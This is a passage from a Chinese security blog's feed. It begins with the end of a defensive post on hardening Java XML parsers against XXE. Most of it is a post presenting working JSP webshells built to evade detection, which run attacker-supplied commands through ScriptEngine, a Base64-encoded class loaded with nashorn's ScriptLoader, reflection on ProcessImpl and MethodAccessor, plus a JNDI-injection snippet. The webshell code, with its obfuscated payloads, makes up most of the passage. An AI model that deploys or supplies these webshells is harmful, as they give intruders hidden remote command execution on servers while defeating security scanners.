class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);</span><br><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;);</span><br></pre></td></tr></table></figure><p>为了保护一个 <code>javax.xml.validation.SchemaFactory</code>来自 XXE，请执行以下操作：</p><h4 id="SchemaFactory"><a href="#SchemaFactory" class="headerlink" title="SchemaFactory"></a>SchemaFactory</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SchemaFactory factory = SchemaFactory.newInstance(&quot;http://www.w3.org/2001/XMLSchema&quot;);</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;);</span><br><span class="line">Schema schema = factory.newSchema(Source);</span><br></pre></td></tr></table></figure><p>为了保护一个 <code>javax.xml.transform.sax.SAXTransformerFactory</code>来自 XXE，请执行以下操作：</p><h4 id="SAXTransformerFactory"><a href="#SAXTransformerFactory" class="headerlink" title="SAXTransformerFactory"></a>SAXTransformerFactory</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SAXTransformerFactory sf = SAXTransformerFactory.newInstance();</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, &quot;&quot;);</span><br><span class="line">sf.newXMLFilter(Source);</span><br></pre></td></tr></table></figure><p>保护 Java <code>org.xml.sax.XMLReader</code>来自 XXE，请执行以下操作：</p><h4 id="XMLReader"><a href="#XMLReader" class="headerlink" title="XMLReader"></a>XMLReader</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XMLReader reader = XMLReaderFactory.createXMLReader();</span><br><span class="line">reader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">reader.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);</span><br><span class="line">reader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">reader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br></pre></td></tr></table></figure><p>保护 Java <code>org.dom4j.io.SAXReader</code>来自 XXE，请执行以下操作：</p><h4 id="saxReader"><a href="#saxReader" class="headerlink" title="saxReader"></a>saxReader</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">saxReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">saxReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">saxReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br></pre></td></tr></table></figure><p>保护 Java <code>org.jdom2.input.SAXBuilder</code>来自 XXE，请执行以下操作：</p><h4 id="SAXBuilder"><a href="#SAXBuilder" class="headerlink" title="SAXBuilder"></a>SAXBuilder</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SAXBuilder builder = new SAXBuilder();</span><br><span class="line">builder.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);</span><br><span class="line">builder.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">builder.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">builder.setExpandEntities(false);</span><br><span class="line">Document doc = builder.build(new File(fileName));</span><br></pre></td></tr></table></figure><p>对于需要 <code>EntityResolver</code>，您可以通过 来抵消 XML 解析器解析实体的能力:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public final class NoOpEntityResolver implements EntityResolver &#123;</span><br><span class="line">  public InputSource resolveEntity(String publicId, String systemId) &#123;</span><br><span class="line">      return new InputSource(new StringReader(&quot;&quot;));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlReader.setEntityResolver(new NoOpEntityResolver());</span><br><span class="line">documentBuilder.setEntityResolver(new NoOpEntityResolver());</span><br></pre></td></tr></table></figure><p>或更简单地说：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EntityResolver noop = (publicId, systemId) -&gt; new InputSource(new StringReader(&quot;&quot;));</span><br><span class="line">xmlReader.setEntityResolver(noop);</span><br><span class="line">documentBuilder.setEntityResolver(noop);</span><br></pre></td></tr></table></figure><p>由于一个 <code>javax.xml.bind.Unmarshaller</code>解析 XML 并且不支持任何禁用 XXE 的标志，必须首先通过可配置的安全解析器解析不受信任的 XML，作为结果生成源对象，并将源对象传递给 Unmarshaller。 例如：</p><h4 id="Unmarshaller"><a href="#Unmarshaller" class="headerlink" title="Unmarshaller"></a>Unmarshaller</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">spf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">spf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">spf.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);</span><br><span class="line">Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(),</span><br><span class="line">      new InputSource(new StringReader(xml)));</span><br><span class="line">JAXBContext jc = JAXBContext.newInstance(Object.class);</span><br><span class="line">Unmarshaller um = jc.createUnmarshaller();</span><br><span class="line">um.unmarshal(xmlSource);</span><br></pre></td></tr></table></figure><p>一种 <code>javax.xml.xpath.XPathExpression</code>无法自行安全配置，因此不可信数据必须先通过另一个安全的 XML 解析器进行解析</p><h4 id="XPathExpression"><a href="#XPathExpression" class="headerlink" title="XPathExpression"></a>XPathExpression</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory df = DocumentBuilderFactory.newInstance();</span><br><span class="line">df.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);</span><br><span class="line">df.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;);</span><br><span class="line">DocumentBuilder builder = df.newDocumentBuilder();</span><br><span class="line">String result = new XPathExpression().evaluate( builder.parse(</span><br><span class="line">    new ByteArrayInputStream(xml.getBytes())) );</span><br></pre></td></tr></table></figure><p><strong>java.beans.XMLDecoder</strong></p><p>的 readObject() 此类中 方法从根本上是不安全的。</p><p>不仅它解析的 XML 受 XXE 约束，而且该方法可用于构造任何 Java 对象，并 执行此处描述的任意代码 。</p><p>除了信任或正确验证传递给它的输入之外，没有办法安全地使用这个类。</p><p>因此，我们强烈建议完全避免使用此类，并使用本备忘单中其他地方所述的安全或正确配置的 XML 解析器替换它。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html</a></p><p><a href="https://blog.csdn.net/weixin_45382656/article/details/118565084?spm=1001.2014.3001.5501">https://blog.csdn.net/weixin_45382656/article/details/118565084?spm=1001.2014.3001.5501</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h2 id=&quot;XXE基础&quot;&gt;&lt;a href=&quot;#XXE基础&quot; class=&quot;headerlink&quot; title=&quot;XXE基础&quot;&gt;&lt;/a&gt;XXE基础&lt;/h2&gt;&lt;h3 id=&quot;XXE概述&quot;&gt;&lt;a href=&quot;#XXE概述&quot; class=&quot;headerlink&quot; title=&quot;XXE概述&quot;&gt;&lt;/a&gt;XXE概述&lt;/h3&gt;&lt;p&gt;XXE（XML External Entity Injection）即XML外部实体注入。漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。&lt;/p&gt;</summary>
    
    
    
    <category term="Web安全" scheme="https://kpa1on.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="XXE" scheme="https://kpa1on.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>JSP Webshell进阶</title>
    <link href="https://kpa1on.github.io/2022/03/21/JSP-Webshell%E8%BF%9B%E9%98%B6/"/>
    <id>https://kpa1on.github.io/2022/03/21/JSP-Webshell%E8%BF%9B%E9%98%B6/</id>
    <published>2022-03-21T07:47:06.000Z</published>
    <updated>2022-04-26T05:05:17.127Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>之前学习了基础的JSP Webshell的免杀思路，现在学习下其他的构建思路</p><span id="more"></span><h2 id="使用ScriptEngine"><a href="#使用ScriptEngine" class="headerlink" title="使用ScriptEngine"></a>使用ScriptEngine</h2><p>使用Java自带的<code>ScriptEngine</code>可以说是最完美的Java动态执行代码方案之一</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;javax.script.ScriptEngineManager&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Base64&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;ScriptEngine.eval的JSP Webshell&lt;/h2&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String s1 = &quot;s=[3];s[0]=&#x27;cmd.exe&#x27;;s[1]=&#x27;/c&#x27;;s[2]=&#x27;&quot;;</span><br><span class="line">    String s2 = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">    String s3 = new String(Base64.getDecoder().decode(&quot;JztqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhzKTs=&quot;));</span><br><span class="line">    Process process = (Process) new ScriptEngineManager().getEngineByName(&quot;nashorn&quot;).eval(s1 + s2 + s3);</span><br><span class="line">    InputStream inputStream = process.getInputStream();</span><br><span class="line">    StringBuilder stringBuilder = new StringBuilder();</span><br><span class="line">    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));</span><br><span class="line">    String line;</span><br><span class="line">    while((line = bufferedReader.readLine()) != null) &#123;</span><br><span class="line">        stringBuilder.append(line).append(&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (stringBuilder.length() &gt; 0) &#123;</span><br><span class="line">        response.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321160323743-1990046549.png" alt="image-20220321160323251"></p><h2 id="使用ScriptLoader"><a href="#使用ScriptLoader" class="headerlink" title="使用ScriptLoader"></a>使用ScriptLoader</h2><p>使用的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Jdk.nashorn.internal.runtime.ScriptLoader类加载器加载的JSP Webshell</span><br></pre></td></tr></table></figure><p>如果某些类加载器被禁用了，就可以使用这个特殊的类加载器去加载字节码执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.security.CodeSource&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.security.cert.Certificate&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Base64&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;jdk.nashorn.internal.runtime.Context&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;jdk.nashorn.internal.runtime.options.Options&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.InvocationTargetException&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;sun.reflect.misc.MethodUtil&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;jdk.nashorn.internal.runtime.ScriptLoader类加载器加载的JSP Webshell&lt;/h2&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  Class c = Class.forName(&quot;jdk.nashorn.internal.runtime.ScriptLoader&quot;);</span><br><span class="line">  final Constructor constructor = c.getDeclaredConstructor(Context.class);</span><br><span class="line">  constructor.setAccessible(true);</span><br><span class="line">  final Method m = c.getDeclaredMethod(&quot;installClass&quot;, String.class, byte[].class, CodeSource.class);</span><br><span class="line">  m.setAccessible(true);</span><br><span class="line">  class A &#123;</span><br><span class="line">    B b;</span><br><span class="line">    final class B &#123;</span><br><span class="line">      private Object o;</span><br><span class="line">      private Object[] oo;</span><br><span class="line"></span><br><span class="line">      public B() throws IllegalAccessException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        o = constructor.newInstance(new Context(new Options(&quot;&quot;), null, null));</span><br><span class="line">        oo = new Object[]&#123;&quot;com.sec.test01.Test&quot;, Base64.getDecoder().decode(&quot;yv66vgAAADQAWgoAGQAsBwAtCgACACwKAC4ALwcAMAgAMQgAMgoALgAzCgA0ADUHADYIADcKAAoAOAcAOQoADQA6CgANADsKAAIAPAgAPQoAAgA+CgANAD8KAAoAPwoAQAA/CgA0AEEKAEIAPwcAQwcARAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAARFdmFsAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwBDBwAwBwAtBwBFBwBGBwA2BwA5AQAKRXhjZXB0aW9ucwcARwEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMABoAGwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyBwBIDABJAEoBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jDABLAEwHAEUMAE0ATgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIBAANHQksMABoATwEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIMABoAUAwAUQBSDABTAFQBAAEKDABVAFIMAFYAGwcARgwAVwBYBwBZAQATY29tL3NlYy90ZXN0MDEvVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAqKExqYXZhL2lvL0lucHV0U3RyZWFtO0xqYXZhL2xhbmcvU3RyaW5nOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEABWNsb3NlAQAPZ2V0T3V0cHV0U3RyZWFtAQAYKClMamF2YS9pby9PdXRwdXRTdHJlYW07AQAUamF2YS9pby9PdXRwdXRTdHJlYW0AIQAYABkAAAAAAAIAAQAaABsAAQAcAAAAHQABAAEAAAAFKrcAAbEAAAABAB0AAAAGAAEAAAAIAAEAHgAfAAIAHAAAAOoABQAJAAAAeLsAAlm3AANNuAAEBr0ABVkDEgZTWQQSB1NZBStTtgAITi22AAk6BLsAClkZBBILtwAMOgW7AA1ZGQW3AA46BhkGtgAPWToHxgASLBkHtgAQEhG2ABBXp//pLLYAEjoIGQa2ABMZBbYAFBkEtgAVLbYAFrYAFxkIsAAAAAIAHQAAADYADQAAAAoACAALACEADAAnAA0ANAAOAD8AEABKABEAWQATAF8AFABkABUAaQAWAG4AFwB1ABgAIAAAACQAAv8APwAHBwAhBwAiBwAjBwAkBwAlBwAmBwAnAAD8ABkHACIAKAAAAAYAAgApACkAAQAqAAAAAgAr&quot;), new CodeSource(null, (Certificate[]) null)&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public A() throws IllegalAccessException, InstantiationException, InvocationTargetException &#123;</span><br><span class="line">      b = new B();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Class invokex(Method method)</span><br><span class="line">            throws InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">      return (Class) MethodUtil.invoke(method, b.o, b.oo);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Class target = new A().invokex(m);</span><br><span class="line">  Method eval = target.getDeclaredMethod(&quot;Eval&quot;, String.class);</span><br><span class="line">  Object cmd = eval.invoke(target.newInstance(), request.getParameter(&quot;cmd&quot;));</span><br><span class="line">  String s = cmd.toString();</span><br><span class="line">  out.println(s);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321162306296-1524479514.png" alt="image-20220321162306337"></p><h2 id="使用内部类"><a href="#使用内部类" class="headerlink" title="使用内部类"></a>使用内部类</h2><p>使用内部类绕过检测<code>java.lang.ProcessImpl</code>以及<code>invoke</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.InvocationTargetException&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Map&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;sun.reflect.misc.MethodUtil&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;java.lang.ProcessImpl JSP Webshell&lt;/h2&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  try &#123;</span><br><span class="line">    final String s = request.getParameter(&quot;threedr3am&quot;);</span><br><span class="line">    class A &#123;</span><br><span class="line"></span><br><span class="line">      B b;</span><br><span class="line"></span><br><span class="line">      final class B &#123;</span><br><span class="line"></span><br><span class="line">        private Method o;</span><br><span class="line">        private Object oo;</span><br><span class="line">        private Object[] ooo;</span><br><span class="line"></span><br><span class="line">        public B() throws ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line">          Class clz = Class.forName(&quot;java.lang.ProcessImpl&quot;);</span><br><span class="line">          Method method = clz</span><br><span class="line">                  .getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class,</span><br><span class="line">                          ProcessBuilder.Redirect[].class, boolean.class);</span><br><span class="line">          method.setAccessible(true);</span><br><span class="line">          o = method;</span><br><span class="line">          oo = clz;</span><br><span class="line">          ooo = new Object[]&#123;s.split(&quot; &quot;), null, null, null, false&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      public A() throws ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line">        b = new B();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      public Object invokex()</span><br><span class="line">              throws InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        return MethodUtil.invoke(b.o, b.oo, b.ooo);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Process process = (Process) new A().invokex();</span><br><span class="line">    InputStream inputStream = process.getInputStream();</span><br><span class="line">    StringBuilder stringBuilder = new StringBuilder();</span><br><span class="line">    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));</span><br><span class="line">    String line;</span><br><span class="line">    while ((line = bufferedReader.readLine()) != null) &#123;</span><br><span class="line">      stringBuilder.append(line).append(&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (stringBuilder.length() &gt; 0) &#123;</span><br><span class="line">      response.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; catch (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321163319503-767675441.png" alt="image-20220321163319663"></p><h2 id="使用MethodAccessor-invoke"><a href="#使用MethodAccessor-invoke" class="headerlink" title="使用MethodAccessor.invoke"></a>使用MethodAccessor.invoke</h2><p>如果检测了<code>Method.invoke</code>，就可以通过<code>MethodAccessor.invoke</code>绕过检测，核心代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ReflectionFactory reflectionFactory = AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());</span><br><span class="line">    MethodAccessor methodAccessor = reflectionFactory.newMethodAccessor(method);</span><br><span class="line">    Process process = (Process) methodAccessor.invoke(null, null);</span><br></pre></td></tr></table></figure><h2 id="使用JdbcRowSetImpl进行jndi注入"><a href="#使用JdbcRowSetImpl进行jndi注入" class="headerlink" title="使用JdbcRowSetImpl进行jndi注入"></a>使用JdbcRowSetImpl进行jndi注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;com.sun.rowset.JdbcRowSetImpl&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;);</span><br><span class="line">JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();</span><br><span class="line">jdbcRowSet.setDataSourceName(request.getParameter(&quot;url&quot;));//ldap://localhost:port/Calc</span><br><span class="line">    try &#123;</span><br><span class="line">        jdbcRowSet.setAutoCommit(true);</span><br><span class="line">    &#125; catch (Throwable e) &#123;</span><br><span class="line">        response.getOutputStream().write(e.getCause().getMessage().getBytes());</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://threedr3am.github.io/2020/06/12/%E9%83%BD0202%E5%B9%B4%E4%BA%86%E8%80%81%E5%97%A8%E8%BF%98%E5%9C%A8%E7%94%A8%E7%9A%84%20-%20%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BFjsp%20webshell/">https://threedr3am.github.io/2020/06/12/%E9%83%BD0202%E5%B9%B4%E4%BA%86%E8%80%81%E5%97%A8%E8%BF%98%E5%9C%A8%E7%94%A8%E7%9A%84%20-%20%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BFjsp%20webshell/</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;之前学习了基础的JSP Webshell的免杀思路，现在学习下其他的构建思路&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Webshell" scheme="https://kpa1on.github.io/tags/Webshell/"/>
    
  </entry>
  
  <entry>
    <title>Jsp Webshell免杀-命令执行</title>
    <link href="https://kpa1on.github.io/2022/03/19/Jsp-Webshell%E5%85%8D%E6%9D%80-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>https://kpa1on.github.io/2022/03/19/Jsp-Webshell%E5%85%8D%E6%9D%80-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2022-03-19T01:22:54.000Z</published>
    <updated>2022-04-26T05:05:08.511Z</updated>
    
